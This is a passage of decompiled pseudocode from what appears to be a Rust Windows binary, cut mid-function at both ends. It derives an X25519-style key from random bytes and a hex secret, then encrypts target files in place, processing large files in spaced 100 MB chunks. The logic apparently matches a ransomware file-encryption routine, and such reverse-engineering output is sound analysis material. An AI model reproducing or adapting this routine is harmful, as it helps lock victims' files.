NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n      NewFilePointer[1].m128i_i64[1] = 2i64;\n      sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 44);\n      sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n    }\n    v48 = sub_14004DECF(64i64, 0);\n    v201 = v49;\n    qmemcpy(v48, \"34e8ef55a1f3b1d7b9ed3e17d6cdb697dc9a0e152fb5726ff82e2f41470f7d55\", 64);\n    memset(NewFilePointer, 0, 32);\n    RandomBuffer[0].m128i_i64[0] = (__int64)v48;\n    RandomBuffer[0].m128i_i64[1] = (__int64)(v48 + 64);\n    RandomBuffer[1].m128i_i32[0] = 1114113;\n    for ( i = 0i64; i != 32; ++i )\n    {\n      v51 = sub_14004DF27((unsigned __int8 **)RandomBuffer);\n      if ( v51 == 1114112 )\n        goto LABEL_72;\n      if ( !sub_14004DFBB(v51) )\n        goto LABEL_72;\n      v53 = v52;\n      v54 = sub_14004DF27((unsigned __int8 **)RandomBuffer);\n      if ( v54 == 1114112 || !sub_14004DFBB(v54) )\n        goto LABEL_72;\n      NewFilePointer[0].m128i_i8[i] = (16 * v53) | v55;\n    }\n    v3 = _mm_load_si128(NewFilePointer);\n    v2 = _mm_load_si128(&NewFilePointer[1]);\nLABEL_72:\n    sub_14004AA27(v48, (__int64)v201);\n    if ( i != 32 )\n      sub_14005E230(\n        (__int64)\"Wrong secret key format. A hex string of 64 chars is expected\",\n        61i64,\n        (__int64)&off_1400607E0);\n    memset(RandomBuffer, 0, 32);\n    v56 = RandomBuffer;\n    v57 = 32i64;\n    while ( v57 )\n    {\n      v58 = 0xFFFFFFFFi64;\n      if ( v57 < 0xFFFFFFFF )\n        v58 = v57;\n      v57 -= v58;\n      v59 = (__m128i *)((char *)v56 + v58);\n      v60 = SystemFunction036(v56, v58);\n      v56 = v59;\n      if ( !v60 )\n      {\n        v135 = (WCHAR *)sub_140001540(4ui64, 4ui64);\n        if ( !v135 )\n          sub_14005DBB0(4i64, 4i64);\n        *(_DWORD *)v135 = -2147483644;\n        lpNewFileName[0] = v135;\n        lpNewFileName[1] = (LPCWSTR)&off_140068258;\n        *(_QWORD *)v191 = lpNewFileName;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_1400682B8;\n        NewFilePointer[0].m128i_i64[1] = 1i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        *(_QWORD *)&v191[8] = sub_14001B700;\n        NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_14005DD00((__int64)NewFilePointer, (__int64)&off_140068328);\n      }\n    }\n    v61 = _mm_load_si128(&RandomBuffer[1]);\n    v155 = _mm_load_si128(RandomBuffer);\n    v154[2] = (__int128)v61;\n    v157 = _mm_or_si128(_mm_andnot_si128(si128, _mm_cvtsi32_si128(v155.m128i_i8[0] & 0xF8)), _mm_and_si128(v155, si128));\n    v158 = _mm_or_si128(_mm_slli_si128(_mm_cvtsi32_si128(v61.m128i_i8[15] & 0x3F | 0x40u), 15), _mm_and_si128(v61, v6));\n    memset(NewFilePointer, 0, 64);\n    for ( j = 0i64; j != 32; ++j )\n    {\n      NewFilePointer[0].m128i_i8[2 * j] = *(_BYTE *)sub_14000891E((__int64)&v157, j, (__int64)&off_140065C48) & 0xF;\n      NewFilePointer[0].m128i_i8[2 * j + 1] = *(_BYTE *)sub_14000891E((__int64)&v157, j, (__int64)&off_140065C60) >> 4;\n    }\n    for ( k = 1i64; k != 64; ++k )\n    {\n      v64 = *((_BYTE *)&v193 + k + 7);\n      *((_BYTE *)&v193 + k + 7) = v64 - ((v64 + 8) & 0xF0);\n      NewFilePointer[0].m128i_i8[k] += (char)(v64 + 8) >> 4;\n    }\n    v65 = _mm_load_si128(&NewFilePointer[1]);\n    v66 = _mm_load_si128(&NewFilePointer[2]);\n    v165 = _mm_load_si128(&NewFilePointer[3]);\n    v164 = v66;\n    v163 = v65;\n    v162 = NewFilePointer[0];\n    memset(v191, 0, 40);\n    *(_QWORD *)&v191[40] = 1i64;\n    memset(&v191[48], 0, 32);\n    *(_QWORD *)v192 = 1i64;\n    memset(&v192[8], 0, 64);\n    v193 = 0i64;\n    for ( m = 0i64; m <= 0x3F; ++m )\n    {\n      if ( (m & 1) != 0 )\n      {\n        sub_14000877D(RandomBuffer, &qword_14006E188[120 * (m >> 1)], v162.m128i_i8[m]);\n        sub_140008687(NewFilePointer, v191, (unsigned __int64 *)RandomBuffer);\n        sub_1400098B2(v191, (unsigned __int64 *)NewFilePointer);\n      }\n    }\n    lpExistingFileName = v35;\n    *((_QWORD *)&v159[4] + 1) = *(_QWORD *)&v191[72];\n    *(__int128 *)((char *)&v159[3] + 8) = *(_OWORD *)&v191[56];\n    *(__int128 *)((char *)&v159[2] + 8) = *(_OWORD *)&v191[40];\n    *(_QWORD *)&v159[7] = *(_QWORD *)&v192[32];\n    v159[6] = *(_OWORD *)&v192[16];\n    v159[5] = *(_OWORD *)v192;\n    *(_QWORD *)&v159[2] = *(_QWORD *)&v191[32];\n    v159[1] = (__int128)_mm_load_si128((const __m128i *)&v191[16]);\n    v159[0] = *(_OWORD *)v191;\n    v68 = 3;\n    while ( 1 )\n    {\n      v69 = v68-- == 0;\n      if ( v69 )\n        break;\n      sub_140009912((__int64)RandomBuffer, (__int64 *)v159);\n      sub_140008D0A(NewFilePointer, (unsigned __int64 *)RandomBuffer, v189);\n      sub_140008D0A(&NewFilePointer[2].m128i_i64[1], &RandomBuffer[2].m128i_u64[1], v188);\n      sub_140008D0A((__m128i *)NewFilePointer[5].m128i_i64, v188, v189);\n      qmemcpy(v159, NewFilePointer, 0x78ui64);\n    }\n    sub_140009912((__int64)NewFilePointer, (__int64 *)v159);\n    sub_1400098B2(v191, (unsigned __int64 *)NewFilePointer);\n    v70 = 0i64;\nLABEL_94:\n    v71 = 0i64;\n    if ( v70 <= 0x40 )\n      v71 = 64 - v70;\n    v72 = v70 & 1;\n    while ( v71 > v72 )\n    {\n      v73 = v70++;\n      if ( (v70 & 1) != 0 )\n      {\n        sub_14000877D(RandomBuffer, &qword_14006E188[120 * (v73 >> 1)], v162.m128i_i8[v73]);\n        sub_140008687(NewFilePointer, v191, (unsigned __int64 *)RandomBuffer);\n        sub_1400098B2(v191, (unsigned __int64 *)NewFilePointer);\n        goto LABEL_94;\n      }\n    }\n    sub_14005D0A0((__m128i *)lpNewFileName, (const __m128i *)v191, 0xA0ui64);\n    sub_1400095C5((__int64)v159, (__int64)v177, (__int64)&lpNewFileName[5]);\n    sub_140009615(v191, v177, &lpNewFileName[5]);\n    sub_1400090CF(NewFilePointer, (__int64 *)v191);\n    sub_140008D0A(RandomBuffer, (unsigned __int64 *)v159, (unsigned __int64 *)NewFilePointer);\n    sub_140008945(&v148, (unsigned __int64 *)RandomBuffer);\n    v152 = _mm_loadu_si128(&v158);\n    v151 = v157;\n    v150[1] = (__int128)v152;\n    v150[0] = (__int128)v157;\n    v168 = v3.m128i_i64[0] & 0x7FFFFFFFFFFFFi64;\n    v169 = (_mm_srli_si128(v3, 6).m128i_u64[0] >> 3) & 0x7FFFFFFFFFFFFi64;\n    *(_QWORD *)&v170 = (_mm_unpacklo_epi32(_mm_shuffle_epi32(v3, 255), v2).m128i_u64[0] >> 6) & 0x7FFFFFFFFFFFFi64;\n    *((_QWORD *)&v170 + 1) = (_mm_srli_si128(v2, 3).m128i_u64[0] >> 1) & 0x7FFFFFFFFFFFFi64;\n    v171 = (_mm_shuffle_epi32(v2, 238).m128i_u64[0] >> 12) & 0x7FFFFFFFFFFFFi64;\n    lpNewFileName[0] = (LPCWSTR)1;\n    v175 = 0i64;\n    memset(&lpNewFileName[1], 0, 48);\n    v176 = 0i64;\n    *(_QWORD *)&v191[32] = v171;\n    *(_OWORD *)&v191[16] = v170;\n    *(_QWORD *)v191 = v3.m128i_i64[0] & 0x7FFFFFFFFFFFFi64;\n    *(_QWORD *)&v191[8] = v169;\n    *(_QWORD *)&v191[40] = 1i64;\n    memset(&v191[48], 0, 32);\n    sub_14005D820((__int64)NewFilePointer, 0, 0x100ui64);\n    for ( n = 0i64; n != 256; ++n )\n    {\n      v75 = *((unsigned __int8 *)v150 + (n >> 3));\n      NewFilePointer[0].m128i_i8[n] = _bittest(&v75, n & 7);\n    }\n    sub_14005D0A0(RandomBuffer, NewFilePointer, 0x100ui64);\n    v76 = 255i64;\n    for ( ii = 255i64; ; v76 = ii )\n    {\n      v69 = ii-- == 0;\n      if ( v69 )\n        break;\n      v78 = sub_14004A649(RandomBuffer[0].m128i_i8[v76] ^ *((_BYTE *)&v186 + v76 + 7));\n      sub_1400097D1(lpNewFileName, v191, v78);\n      sub_1400095C5((__int64)v147, (__int64)lpNewFileName, (__int64)&lpNewFileName[5]);\n      sub_140009615(v146, lpNewFileName, &lpNewFileName[5]);\n      sub_1400095C5((__int64)v145, (__int64)v191, (__int64)&v191[40]);\n      sub_140009615(v144, v191, &v191[40]);\n      sub_14000954C((__int64 *)v143, (__int64 *)v147);\n      sub_14000954C((__int64 *)v142, (__int64 *)v146);\n      sub_140009615(v141, v143, v142);\n      sub_140008D0A(v140, v147, v144);\n      sub_140008D0A(v139, v146, v145);\n      sub_1400095C5((__int64)v138, (__int64)v140, (__int64)v139);\n      sub_140009615(v153, v140, v139);\n      sub_14000954C((__int64 *)v191, v138);\n      sub_14000954C(v162.m128i_i64, (__int64 *)v153);\n      sub_140008D0A(v159, qword_140065C78, v141);\n      sub_140008D0A(lpNewFileName, v143, v142);\n      sub_1400095C5((__int64)NewFilePointer, (__int64)v159, (__int64)v142);\n      sub_140008D0A(&lpNewFileName[5], v141, (unsigned __int64 *)NewFilePointer);\n      sub_140008D0A(&v191[40], (unsigned __int64 *)&v168, (unsigned __int64 *)&v162);\n    }\n    v79 = sub_14004A649(RandomBuffer[0].m128i_i8[0]);\n    sub_1400097D1(lpNewFileName, v191, v79);\n    sub_1400090CF(NewFilePointer, (__int64 *)&lpNewFileName[5]);\n    sub_140008D0A(v159, (unsigned __int64 *)lpNewFileName, (unsigned __int64 *)NewFilePointer);\n    sub_140008945(v156, (unsigned __int64 *)v159);\n    sub_1400097BF((__int64)&v151);\n    v80 = sub_14004DECF(15i64, 0);\n    v166 = v81;\n    v82 = *(__int64 *)((char *)v156[0].m128i_i64 + 7);\n    *(_QWORD *)v80 = v156[0].m128i_i64[0];\n    v184 = v80;\n    *(_QWORD *)(v80 + 7) = v82;\n    v83 = (__m128i *)sub_14004DECF(16i64, 0);\n    v167 = v84;\n    v185 = (__int128 *)v83;\n    *v83 = v156[1];\n    if ( v197 > 0x9600000 )\n    {\n      v190 = v2;\n      v35 = (WCHAR *)lpExistingFileName;\n      if ( (unsigned __int64)qword_140087B48 >= 5 )\n      {\n        sub_14000116A((__int64)RandomBuffer, (__int64)v195);\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060898;\n        NewFilePointer[0].m128i_i64[1] = 2i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        *(_QWORD *)v191 = RandomBuffer;\n        *(_QWORD *)&v191[8] = sub_140033450;\n        NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 61);\n        sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n      }\n      v85 = si128;\n      v201 = (WCHAR *)sub_14004DECF(104857600i64, 1);\n      lpNewFileName[0] = v201;\n      lpNewFileName[1] = v86;\n      lpNewFileName[2] = (LPCWSTR)104857600;\n      if ( (unsigned __int64)qword_140087B48 >= 4 )\n      {\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_14006E000;\n        NewFilePointer[0].m128i_i64[1] = 1i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[0].m128i_i64[0] = (__int64)&v178;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_140001000;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_140009CB8((__int64)NewFilePointer, 4i64, (__int128 *)&off_140067880, 65);\n      }\n      v87 = v6;\n      if ( (v178 & 0x8000000000000000ui64) != 0i64 )\n        v88 = (float)(int)((v178 >> 1) | v178 & 1) + (float)(int)((v178 >> 1) | v178 & 1);\n      else\n        v88 = (float)(int)v178;\n      v92 = v7;\n      v93 = 104857600.0 / (float)(v88 * *(float *)&v7);\n      if ( (unsigned __int64)qword_140087B48 <= 3 )\n      {\n        v94 = 0i64;\n        if ( v93 >= 0.0 )\n          v94 = (unsigned int)(int)v93;\n        if ( v93 > 1.8446743e19 )\n          v94 = -1i64;\n      }\n      else\n      {\n        v94 = 0i64;\n        if ( v93 >= 0.0 )\n          v94 = (unsigned int)(int)v93;\n        if ( v93 > 1.8446743e19 )\n          v94 = -1i64;\n        *(_QWORD *)v191 = v94;\n        NewFilePointer[0].m128i_i64[0] = (__int64)&off_1400608C8;\n        NewFilePointer[0].m128i_i64[1] = 1i64;\n        NewFilePointer[2].m128i_i64[0] = 0i64;\n        RandomBuffer[0].m128i_i64[0] = (__int64)v191;\n        RandomBuffer[0].m128i_i64[1] = (__int64)sub_140001000;\n        NewFilePointer[1].m128i_i64[0] = (__int64)RandomBuffer;\n        NewFilePointer[1].m128i_i64[1] = 1i64;\n        sub_140009CB8((__int64)NewFilePointer, 4i64, (__int128 *)&off_140067880, 68);\n      }\n      if ( !v94 )\n        sub_14005DEC0(\n          (__int64)\"assertion failed: step != 0/rustc/a28077b28a02b92985b3a3faecf92813155f1ea1\\\\library\\\\core\\\\src\\\\iter\\\\\"\n                   \"adapters\\\\step_by.rs\",\n          27i64,\n          (__int64)&off_1400606D8);\n      v100 = v197 / v94 - ((v197 % v94 == 0) - 1i64);\n      v200 = 104857600i64;\n      v101.QuadPart = 0i64;\n      v198 = (char *)v94;\n      while ( 1 )\n      {\nLABEL_142:\n        v69 = v100-- == 0;\n        if ( v69 )\n          goto LABEL_162;\n        v153[0] = v101;\n        v102 = v101;\n        if ( (unsigned __int64)qword_140087B48 > 4 )\n        {\n          sub_14000116A((__int64)v191, (__int64)v195);\n          NewFilePointer[0].m128i_i64[0] = (__int64)v191;\n          v94 = (unsigned __int64)v198;\n          NewFilePointer[0].m128i_i64[1] = (__int64)sub_140033450;\n          NewFilePointer[1].m128i_i64[0] = (__int64)v153;\n          NewFilePointer[1].m128i_i64[1] = (__int64)sub_140001000;\n          RandomBuffer[0].m128i_i64[0] = (__int64)&off_1400608F0;\n          RandomBuffer[0].m128i_i64[1] = 3i64;\n          RandomBuffer[2].m128i_i64[0] = 0i64;\n          NewFilePointer[2].m128i_i64[0] = (__int64)&v197;\n          NewFilePointer[2].m128i_i64[1] = (__int64)sub_140001000;\n          RandomBuffer[1].m128i_i64[0] = (__int64)NewFilePointer;\n          RandomBuffer[1].m128i_i64[1] = 3i64;\n          sub_140009CB8((__int64)RandomBuffer, 5i64, (__int128 *)&off_140067880, 70);\n          sub_14004AA27(*(void **)v191, *(__int64 *)&v191[8]);\n          v102 = v153[0];\n        }\n        if ( v197 - v102.QuadPart < v94 )\n        {\nLABEL_162:\n          sub_14004AA27(v201, (__int64)lpNewFileName[1]);\n          goto LABEL_163;\n        }\n        sub_140035E90((union _LARGE_INTEGER *)NewFilePointer, v35, 0i64, v102);\n        sub_1400010FE(\n          NewFilePointer[0].m128i_i64[0],\n          NewFilePointer[0].m128i_i64[1],\n          (__int64)\"Unable to seek to position\",\n          26i64,\n          (__int64)&off_140060940);\n        if ( (unsigned __int64)qword_140087B48 > 4 )\n        {\n          sub_14000116A((__int64)v191, (__int64)v195);\n          sub_14001298E((union _LARGE_INTEGER *)v159, (void *)lpExistingFileName);\n          NewFilePointer[0].m128i_i64[0] = (__int64)v191;\n          v35 = (WCHAR *)lpExistingFileName;\n          NewFilePointer[0].m128i_i64[1] = (__int64)sub_140033450;\n          NewFilePointer[1].m128i_i64[0] = (__int64)v159;\n          NewFilePointer[1].m128i_i64[1] = (__int64)sub_140017700;\n          RandomBuffer[0].m128i_i64[0] = (__int64)&off_140060970;\n          RandomBuffer[0].m128i_i64[1] = 3i64;\n          RandomBuffer[2].m128i_i64[0] = 0i64;\n          NewFilePointer[2].m128i_i64[0] = (__int64)&v197;\n          NewFilePointer[2].m128i_i64[1] = (__int64)sub_140001000;\n          RandomBuffer[1].m128i_i64[0] = (__int64)NewFilePointer;\n          RandomBuffer[1].m128i_i64[1] = 3i64;\n          sub_140009CB8((__int64)RandomBuffer, 5i64, (__int128 *)&off_140067880, 75);\n          v94 = (unsigned __int64)v198;\n          sub_140001086(v159);\n          sub_14004AA27(*(void **)v191, *(__int64 *)&v191[8]);\n        }\n        sub_140035180((__int64)NewFilePointer, v35, v201, v200);\n        if ( NewFilePointer[0].m128i_i64[0] )\n          break;\n        v162.m128i_i64[0] = NewFilePointer[0].m128i_i64[1];\n        if ( !NewFilePointer[0].m128i_i64[1] )\n          goto LABEL_162;\n        v101.QuadPart += v94;\n        v103 = sub_1400274A5(NewFilePointer[0].m128i_u64[1], (__int64)v201, v200, (__int64)&off_1400609A0);\n        v105 = 0i64;\n        while ( v104 != v105 )\n        {\n          if ( *(_BYTE *)(v103 + v105++) != 0 )\n          {\n            v107 = sub_1400274A5(v162.m128i_u64[0], (__int64)v201, v200, (__int64)&off_1400609B8);\n            sub_140017876((__int64)NewFilePointer, v107, v108, (__int64)v184, 0xFui64, v185);\n            if ( NewFilePointer[0].m128i_i64[0] )\n            {\n              RandomBuffer[1].m128i_i64[0] = NewFilePointer[1].m128i_i64[0];\n              RandomBuffer[0] = NewFilePointer[0];\n            }\n            else\n            {\n              RandomBuffer[0].m128i_i64[0] = 0i64;\n            }\n            sub_140001096((__int64)NewFilePointer, RandomBuffer, (__int64)&off_1400609D0);\n            sub_140035E90((union _LARGE_INTEGER *)RandomBuffer, v35, 0i64, v153[0]);\n            sub_1400010FE(\n              RandomBuffer[0].m128i_i64[0],\n              RandomBuffer[0].m128i_i64[1],\n              (__int64)\"Unable to seek to position\",\n              26i64,\n              (__int64)&off_1400609E8);\n            v109 = (void *)NewFilePointer[0].m128i_i64[0];\n            v110 = sub_14001299C((__int64)v35, NewFilePointer[0].m128i_i64[0], NewFilePointer[1].m128i_u64[0]);\n            sub_140001138((__int64)v110, (__int64)\"Unable to write data to file\", 28i64, (__int64)&off_140060A00);\n            lpNewFileName[2] = 0i64;\n            sub_14004DE13((__int64 *)lpNewFileName, 0x6400000ui64);\n            v201 = (WCHAR *)lpNewFileName[0];\n            v111 = lpNewFileName[2];\n            v112 = (char *)lpNewFileName[2] + (unsigned __int64)lpNewFileName[0];\n            for ( jj = 0i64; jj != 104857599; ++jj )\n              v112[jj] = 0;\n            v112[104857599] = 0;\n            v200 = (__int64)(v111 + 52428800);\n            lpNewFileName[2] = v111 + 52428800;\n            sub_14004AA27(v109, NewFilePointer[0].m128i_i64[1]);\n            v94 = (unsigned __int64)v198;\n            goto LABEL_142;\n          }\n        }\n        if ( (unsigned __int64)qword_140087B48 > 4 )\n        {\n          sub_14000116A((__int64)v191, (__int64)v195);\n          sub_14001298E((union _LARGE_INTEGER *)v159, (void *)lpExistingFileName);\n          NewFilePointer[0].m128i_i64[0] = (__int64)v191;\n          v35 = (WCHAR *)lpExistingFileName;\n          NewFilePointer[0].m128i_i64[1] = (__int64)sub_140033450;\n          NewFilePointer[1].m128i_i64[0] = (__int64)v159;\n          NewFilePointer[1].m128i_i64[1] = (__int64)sub_140017700;\n          RandomBuffer[0].m128i_i64[0] = (__int64)&off_140060A50;\n          RandomBuffer[0].m128i_i64[1] = 4i64;\n          RandomBuffer[2].m128i_i64[0] = 0i64;\n          NewFilePointer[2].m128i_i64[0] = (__int64)&v162;\n          NewFilePointer[2].m128i_i64[1] = (__int64)sub_140001000;\n          RandomBuffer[1].m128i_i64[0] = (__int64)NewFilePointer;\n          RandomBuffer[1].m128i_i64[1] = 3i64;\n          sub_140009CB8((__int64)RandomBuffer, 5i64, (__int128 *)&off_140067880, 81);\n          v94 = (unsigned __int64)v198;\n          sub_140001086(v159);\n          sub_14004AA27(*(void **)v191, *(__int64 *)&v191[8]);\n        }\n      }\n      v47 = (LPCWSTR)NewFilePointer[0].m128i_i64[1];\n      sub_14004AA27(v201, (__int64)lpNewFileName[1]);\n      v7 = v92;\n      si128 = v85;\n      v2 = _mm_load_si128(&v190);\n      goto LABEL_214;\n    }\n    v89 = (WCHAR *)lpExistingFileName;\n    if ( (unsigned __int64)qword_140087B48 > 4 )\n    {\n      sub_14000116A((__int64)RandomBuffer, (__int64)v195);\n      NewFilePointer[0].m128i_i64[0] = (__int64)&off_140060810;\n      NewFilePointer[0].m128i_i64[1] = 2i64;\n      NewFilePointer[2].m128i_i64[0] = 0i64;\n      *(_QWORD *)v191 = RandomBuffer;\n      *(_QWORD *)&v191[8] = sub_140033450;\n      NewFilePointer[1].m128i_i64[0] = (__int64)v191;\n      NewFilePointer[1].m128i_i64[1] = 1i64;\n      sub_140009CB8((__int64)NewFilePointer, 5i64, (__int128 *)&off_140067880, 92);\n      sub_14004AA27((void *)RandomBuffer[0].m128i_i64[0], RandomBuffer[0].m128i_i64[1]);\n    }\n    *(_QWORD *)v191 = 1i64;\n    *(_OWORD *)&v191[8] = 0i64;\n    sub_140034DF0((__int64)NewFilePointer, v89);\n    if ( NewFilePointer[0].m128i_i32[0] == 2 )\n    {\n      v90.m128i_i32[0] = NewFilePointer[0].m128i_i32[2];\n      if ( (unsigned __int64)(NewFilePointer[0].m128i_i8[8] & 3) - 2 >= 2 && (NewFilePointer[0].m128i_i8[8] & 3) != 0 )\n      {\n        v201 = (WCHAR *)(NewFilePointer[0].m128i_i64[1] - 1);\n        v91 = *(void (***)(void))(NewFilePointer[0].m128i_i64[1] + 7);\n        v198 = *(char **)(NewFilePointer[0].m128i_i64[1] - 1);\n        v200 = (__int64)v91;\n        (*v91)();\n        if ( *(_QWORD *)(v200 + 8) )\n          sub_1400015D0(v198, *(_QWORD *)(v200 + 16));\n        v90.m128i_i32[0] = sub_1400015D0(v201, 8ui64);\n      }\n    }\n    else\n    {\n      v95 = NewFilePointer[3].m128i_u64[1];\n      NewFilePointer[0].m128i_i64[0] = 0i64;\n      if ( SetFilePointerEx(v89, 0i64, (PLARGE_INTEGER)NewFilePointer, 1u) )\n      {\n        v69 = v95 < NewFilePointer[0].m128i_i64[0];\n        v96 = v95 - NewFilePointer[0].m128i_i64[0];\n        v90.m128i_i32[0] = 0;\n        if ( v69 )\n          v96 = 0i64;\n        v90.m128i_i64[1] = 0i64;\n        v97 = 0i64;\n        if ( v96 )\n        {\n          v90.m128i_i64[0] = sub_14005EE10((__int64 *)v191, 0i64, v96);\n          v90.m128i_i64[1] = *(_QWORD *)&v191[8];\n          v97 = *(char **)&v191[16];\n        }\n        v90.m128i_i8[0] = 1;\n        LODWORD(v201) = v90.m128i_i32[0];\n        v69 = __CFADD__(v96, 1024i64);\n        v98 = (char *)(v96 + 1024);\n        if ( !v69 )\n        {\n          v99 = (unsigned __int16)v98 & 0x1FFF;\n          if ( ((unsigned __int16)v98 & 0x1FFF) != 0 )\n          {\n            v198 = &v98[0x2000 - v99];\n            LOBYTE(v99) = __CFADD__(0x2000 - v99, v98);\n            LODWORD(v201) = v99;\n          }\n          else\n          {\n            v198 = v98;\n            LODWORD(v201) = 0;\n          }\n        }\n        goto LABEL_177;\n      }\n      v90.m128i_i32[0] = GetLastError();\n    }\n    v90.m128i_i8[0] = 1;\n    LODWORD(v201) = v90.m128i_i32[0];\n    v97 = 0i64;\n    v90.m128i_i64[1] = 0i64;\nLABEL_177:\n    v186 = v90.m128i_i64[1];\n    v117 = 0i64;\n    while ( 1 )\n    {\n      do\n      {\n        v118 = (__int64)v97;\n        while ( 1 )\n        {\n          if ( v118 == v90.m128i_i64[1] )\n          {\n            sub_14005EE10((__int64 *)v191, v90.m128i_i64[1], 32i64);\n            v90.m128i_i64[1] = *(_QWORD *)&v191[8];\n            v118 = *(_QWORD *)&v191[16];\n          }\n          v200 = *(_QWORD *)v191;\n          v119 = v90.m128i_i64[1];\n          v120 = v90.m128i_i64[1] - v118;\n          v90.m128i_i64[1] = (__int64)v198;\n          if ( v120 < (unsigned __int64)v198 )\n            v90.m128i_i64[1] = v120;\n          if ( (_BYTE)v201 )\n            v90.m128i_i64[1] = v120;\n          v90.m128i_i64[0] = v118 + *(_QWORD *)v191;\n          RandomBuffer[0] = v90;\n          RandomBuffer[1].m128i_i64[0] = 0i64;\n          RandomBuffer[1].m128i_i64[1] = v117;\n          v121 = sub_140034F00((void *)lpExistingFileName, RandomBuffer);\n          if ( !v121 )\n            break;\n          v47 = (LPCWSTR)v121;\n          switch ( v121 & 3 )\n          {\n            case 0i64:\n              if ( *(_BYTE *)(v121 + 16) != 35 )\n                goto LABEL_212;\n              goto LABEL_193;\n            case 1i64:\n              if ( *(_BYTE *)(v121 + 15) == 35 )\n              {\n                v200 = v121 - 1;\n                JUMPOUT(0x140011082i64);\n              }\n              goto LABEL_212;\n            case 2i64:\n              goto LABEL_212;\n            case 3i64:\n              if ( HIDWORD(v121) != 35 )\n                goto LABEL_212;\nLABEL_193:\n              v90.m128i_i64[1] = v119;\n              break;\n          }\n        }\n        if ( !RandomBuffer[1].m128i_i64[0] )\n          goto LABEL_232;\n        v117 = RandomBuffer[1].m128i_i64[1] - RandomBuffer[1].m128i_i64[0];\n        if ( RandomBuffer[1].m128i_i64[1] < (unsigned __int64)RandomBuffer[1].m128i_i64[0] )\n          sub_14005E0B0(RandomBuffer[1].m128i_i64[0], RandomBuffer[1].m128i_i64[1], (__int64)&off_14006B2E8);\n        v122 = RandomBuffer[0].m128i_i64[1];\n        if ( RandomBuffer[1].m128i_i64[1] > (unsigned __int64)RandomBuffer[0].m128i_i64[1] )\n        {\n          v136 = (void **)&off_14006B2E8;\n          v137 = (LPCWSTR)RandomBuffer[1].m128i_i64[1];\nLABEL_251:\n          sub_14005DE40((__int64)v137, v122, (__int64)v136);\n        }\n        v97 = (char *)(v118 + RandomBuffer[1].m128i_i64[0]);\n        *(_QWORD *)&v191[16] = v118 + RandomBuffer[1].m128i_i64[0];\n        v90.m128i_i64[1] = v119;\n      }\n      while ( v119 != v186 || v97 != (char *)v119 );\n      memset(NewFilePointer, 0, 32);\n      while ( 2 )\n      {\n        sub_140035180((__int64)lpNewFileName, (void *)lpExistingFileName, NewFilePointer, 0x20ui64);\n        if ( lpNewFileName[0] )\n        {\n          v47 = lpNewFileName[1];\n          switch ( (__int64)lpNewFileName[1] & 3 )\n          {\n            case 0i64:\n              if ( *((_BYTE *)lpNewFileName[1] + 16) != 35 )\n                goto LABEL_212;\n              continue;\n            case 1i64:\n              if ( *((_BYTE *)lpNewFileName[1] + 15) == 35 )\n              {\n                v190.m128i_i64[0] = (__int64)lpNewFileName[1] - 1;\n                JUMPOUT(0x1400111CCi64);\n              }\n              goto LABEL_212;\n            case 2i64:\n              goto LABEL_212;\n            case 3i64:\n              if ( HIDWORD(lpNewFileName[1]) == 35 )\n                continue;\nLABEL_212:\n              v126 = v119;\n              break;\n          }\n          goto LABEL_213;\n        }\n        break;\n      }\n      v123 = lpNewFileName[1];\n      if ( !lpNewFileName[1] )\n        break;\n      if ( lpNewFileName[1] >= (LPCWSTR)0x21 )\n      {\n        v136 = &off_14006B300;\n        v122 = 32i64;\n        v137 = lpNewFileName[1];\n        goto LABEL_251;\n      }\n      sub_14005EE10((__int64 *)v191, v186, (__int64)lpNewFileName[1]);\n      v124 = *(_QWORD *)&v191[8];\n      v125 = *(_QWORD *)&v191[16];\n      sub_14005D0A0((__m128i *)(*(_QWORD *)&v191[16] + *(_QWORD *)v191), NewFilePointer, (unsigned __int64)v123);\n      v90.m128i_i64[1] = v124;\n      v97 = (char *)v123 + v125;\n      *(_QWORD *)&v191[16] = v97;\n    }\n    v118 = v186;\nLABEL_232:\n    sub_140035E90((union _LARGE_INTEGER *)NewFilePointer, (void *)lpExistingFileName, 0i64, 0i64);\n    v47 = (LPCWSTR)NewFilePointer[0].m128i_i64[0];\n    if ( NewFilePointer[0].m128i_i64[0] )\n      v47 = (LPCWSTR)NewFilePointer[0].m128i_i64[1];\n    v126 = v119;\n    if ( NewFilePointer[0].m128i_i64[0] )\n    {\nLABEL_213:\n      sub_14004AA27((void *)v200, v126);\n      v35 = (WCHAR *)lpExistingFileName;\n    }\n    else\n    {\n      v190 = v2;\n      v85 = si128;\n      v87 = v6;\n      sub_140017876((__int64)NewFilePointer, v200, v118, (__int64)v184, 0xFui64, v185);\n      v92 = v7;\n      if ( NewFilePointer[0].m128i_i64[0] )\n      {\n        RandomBuffer[1].m128i_i64[0] = NewFilePointer[1].m128i_i64[0];\n        RandomBuffer[0] = NewFilePointer[0];\n      }\n      else\n      {\n        RandomBuffer[0].m128i_i64[0] = 0i64;\n      }\n      sub_140001096((__int64)NewFilePointer, RandomBuffer, (__int64)&off_140060830);\n      v130 = (void *)NewFilePointer[0].m128i_i64[0];\n      v131 = lpExistingFileName;\n      v132 = sub_14001299C((__int64)lpExistingFileName, NewFilePointer[0].m128i_i64[0], NewFilePointer[1].m128i_u64[0]);\n      sub_140001138((__int64)v132, (__int64)\"Unable to write data to file\", 28i64, (__int64)&off_140060868);\n      sub_14004AA27(v130, NewFilePointer[0].m128i_i64[1]);\n      v133 = v119;\n      v35 = (WCHAR *)v131;\n      sub_14004AA27((void *)v200, v133);\n      v93 = 0.0;\nLABEL_163:\n      v114 = (unsigned 